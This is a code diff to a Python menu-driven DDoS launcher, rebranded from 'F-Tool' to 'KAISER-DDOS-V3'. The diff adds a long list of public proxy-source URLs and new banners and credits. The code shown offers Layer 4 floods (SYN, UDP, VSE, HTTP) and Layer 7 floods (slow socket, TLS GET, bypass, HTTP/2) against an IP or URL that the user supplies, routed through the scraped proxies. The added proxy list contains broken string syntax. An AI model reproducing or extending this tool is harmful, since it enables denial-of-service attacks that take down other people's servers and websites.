@@ -45,9 +45,50 @@ class Home:
 		#self.styleText("\n [*] Downloading Proxy...\n")
 		file_name = "utils/http.txt"
 		http_proxies = [
-			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+             "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
 			"https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
-			"https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous"]
+			"https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous", "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
+           "https://www.proxy-list.download/api/v1/get?type=socks4",
+           "https://www.proxyscan.io/download?type=socks4",
+           "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+           "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
+           "https://api.openproxylist.xyz/socks4.txt",
+           "https://www.freeproxychecker.com/result/socks4_proxies.txt",
+           "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
+           "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
+           "https://www.proxy-list.download/api/v1/get?type=socks5",
+           "https://www.proxyscan.io/download?type=socks5",
+           "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+           "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+           "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
+           "https://api.openproxylist.xyz/socks5.txt
+           "https://www.freeproxychecker.com/result/socks5_proxies.txt",
+           "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
+           "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
+           "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
+           "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+           "https://www.proxy-list.download/api/v1/get?type=http&anon=elite&country=US",
+           "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+           "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+           "https://www.proxy-list.download/api/v1/get?type=http",
+           "https://www.proxyscan.io/download?type=http",
+           "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+           "https://api.openproxylist.xyz/http.txt",
+           "http://alexa.lr2b.com/proxylist.txt",
+           "http://rootjazz.com/proxies/proxies.txt",
+           "https://www.freeproxychecker.com/result/http_proxies.txt",
+                      https://api.proxyscrape.com/v2?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+           "http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http",
+           "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+           "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+           "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
+           "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
+           "https://proxy-spider.com/api/proxies.example.txt",
+           "https://multiproxy.org/txt_all/proxy.txt",
+           "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+           "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
+           "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt"
+]
 		with open(file_name, 'w'):
 			for proxies in http_proxies:
 				if httpx.get(proxies).status_code == 200:
@@ -64,12 +105,10 @@ class Home:
 
 	def home(self): # don't edit this banner lol
 		print(f"""
-                        {Color.LG}╔══════════════════════╗
-    {Color.LC}╔═╗{Color.LB} ╔╦╗╔═╗╔═╗╦      {Color.LG}║ {Color.LR}Created: {Color.LY}5/3/22      {Color.LG}║
-    {Color.LC}╠╣{Color.LB}{Color.LR}───{Color.LB}║ ║ ║║ ║║      {Color.LG}║ {Color.LR}Updated: {Color.LY}8/3/22      {Color.LG}║
-    {Color.LC}╚{Color.LB}    ╩ ╚═╝╚═╝╩═╝{Color.LG}v2  {Color.LG}║ {Color.LB}Simple but mighty XD {Color.LG}║
-                        {Color.LG}╚══════════════════════╝
-    {Color.LR}[{Color.LG}>     Made with ☕ By FDc0d3 & Aya    {Color.LG}<{Color.LR}]""")
+                        {Color.LG}▒█░▄▀ ░█▀▀█ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█   ▀▀█▀▀ ▒█▀▀▀█ ▒█▀▀▀█ ▒█░{Color.LB}
+            {Color.LB}▒█▀▄░ ▒█▄▄█ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀   ░▒█░░ ▒█░░▒█ ▒█░░▒█ ▒█░{Color.LC}
+            {Color.LC}▒█░▒█ ▒█░▒█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█   ░▒█░░ ▒█▄▄▄█ ▒█▄▄▄█ ▒█▄▄█{Color.LG}
+    {Color.LR}[{Color.LG}>     Made with ☕ By HuyKaiser PROCODER    {Color.LG}<{Color.LR}]""")
 		print(Color.LC+"    Type "+Color.LB+"'HELP'"+Color.LC+" to see all commands\n\n")
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Proxy")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" WebTool")
@@ -78,7 +117,7 @@ class Home:
 		print("\n")
 		while True:
 			try:
-				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Home"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"KAISER-DDOS-V3"+Color.LB+"@"+Color.LG+"Home"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 				option = input()
 				if option in ['01', '1']:
 					os.system('clear')
@@ -103,7 +142,7 @@ class Home:
 				elif option in ['dev', 'DEV']:
 					print(self.dev)
 				elif option in ['exit', 'EXIT']:
-					subprocess.run(['pkill -f F-Tool.py'], shell=True)
+					subprocess.run(['pkill -f Kaiser-Ddos-V3.py'], shell=True)
 				elif option in ['stop', 'STOP']:
 					subprocess.run(['pkill screen'], shell=True)
 					print(f"{Color.LG} [!] Attack Stopped!")
@@ -240,9 +279,9 @@ class Tool:
 			sys.exit(f"{Color.LR}ERROR:{Color.RESET} File: 'utils' NotFound")
 		if new in ['ref', 'REF', 'clear', 'CLEAR']:
 			os.system('clear')
-			F_Tool.styleText("[*] Downloading New Proxy...")
+			F_Tool.styleText("[*] Đang Cập Nhật Proxy Ddos...")
 		else:
-			F_Tool.styleText("[*] Downloading All Proxy...")
+			F_Tool.styleText("[*] Đã Cập Nhật All Proxy Ddos...")
 		try:
 			for proxy in readjson['Proxies']:
 				if proxy['type'] == 1:
@@ -276,7 +315,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" SOCKS5 PROXY")
 		print("\n")
 		while True:
-				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"KAISER-DDOS-V3"+Color.LB+"@"+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 				option = input()
 				if option in ['01', '1']:
 					with open("http.txt", 'w') as p:
@@ -335,7 +374,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" EXTRACT LINK")
 		print("\n")
 		while True:
-			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"KAISER-DDOS-V3"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
 			if option in ['01', '1']:
 				while True:
@@ -451,7 +490,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" Layer7")
 		print("\n")
 		while True:
-			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"KAISER-DDOS-V3"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
 			if option in ['01', '1']:
 				os.system('clear');self.l4()
@@ -466,7 +505,7 @@ class Tool:
 			elif option in ['dev', 'Dev']:
 				print(self.dev)
 			elif option in ['exit', 'EXIT']:
-				subprocess.run(['pkill -f F-Tool.py'], shell=True)
+				subprocess.run(['pkill -f Kaiser-Ddos-V3.py'], shell=True)
 			elif option in ['stop', 'STOP']:
 				subprocess.run(['pkill screen'], shell=True)
 				print(f"{Color.LG} [!] Attack Stopped!")
@@ -485,7 +524,7 @@ class Tool:
   / /__| (_| | |_| |  __/ |  |__   _|
   \____/\__,_|\__, |\___|_|     |_|
               |___/
-
+ADMIN TOOL : VĂN HUY X KAISER PROJECT 
 """)
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" VSE: UDP Valve Source Engine specific flood")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" SYN: TCP SYN flood")
@@ -495,7 +534,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
 		while True:
-			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"KAISER-DDOS-V3"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
 			if option in ['01', '1']:
 				try:
@@ -504,7 +543,7 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/vse {ip} {port} {floodtime} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Attack KAISER-DDOS-V3 Thành Công!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['02', '2']:
@@ -514,7 +553,7 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/syn {ip} {port} {floodtime} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Attack KAISER-DDOS-V3 Thành Công!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['03', '3']:
@@ -536,7 +575,7 @@ class Tool:
 					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Attack KAISER-DDOS-V3 Thành Công!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['05', '5']:
@@ -545,7 +584,7 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {floodtime} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Attack KAISER-DDOS-V3 Thành Công!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['ref', 'REF']:
@@ -580,7 +619,7 @@ class Tool:
   / /__| (_| | |_| |  __/ |   / /
   \____/\__,_|\__, |\___|_|  /_/
               |___/
-
+ ADMIN TOOL : VĂN HUY X KAISER PROJECT 
 """)
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET: Slow HTTP/1.1 socket flood (JS)")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTP1: TLS HTTP/1.1 GET flood (JS)")
@@ -589,7 +628,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
 		while True:
-			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"KAISER-DDOS-V3"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
 			if option in ['01', '1']:
 				try:
@@ -597,7 +636,7 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Attack KAISER-DDOS-V3 Thành Công!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['02', '2']:
@@ -605,7 +644,7 @@ class Tool:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Attack KAISER-DDOS-V3 Thành Công!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['03', '3']:
@@ -613,7 +652,7 @@ class Tool:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Attack KAISER-DDOS-V3 Thành Công!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['04', '4']:
@@ -621,7 +660,7 @@ class Tool:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Attack KAISER-DDOS-V3 Thành Công!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['ref', 'REF']:
@@ -691,7 +730,7 @@ def main():
 		else:
 			pass
 	if install == False:
-		sys.exit(f'\n[?] Error? try:{Color.LG} sh install.sh')
+		sys.exit(f'\n[?] Error? try:{Color.LG} sh HuyKaiserDZ.sh')
 	else:pass
 	try:
 		script = True
@@ -699,7 +738,7 @@ def main():
 	except IsADirectoryError:pass
 	except FileNotFoundError:
 		print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'utils' NotFound")
-		print("\n[+] Please download on GitHub, or git clone: https://github.com/FDc0d3/F-Tool.git\n")
+		print("\n[+] Please download on GitHub, or git clone: https://github.com/HuyKaiserDZ/KAISER-DDOS-V3.git\n")
 		os.remove(f'{__file__}')
 		script = False
 	if script == False:sys.exit()
@@ -718,5 +757,5 @@ if __name__ == '__main__':
 {Color.LC}New[BTC]Address{Color.LR}: {Color.LY}32FGCnt4uwkkByWuH8V4qyCSfynm1iVsmB"""
 	F_Tool = Home(commands, dev)
 	Tool = Tool(commands, dev, spoof_useragents())
-	try:open('F-Tool.py');main()
+	try:open('Kaiser-Ddos-V3.py');main()
 	except:quit()
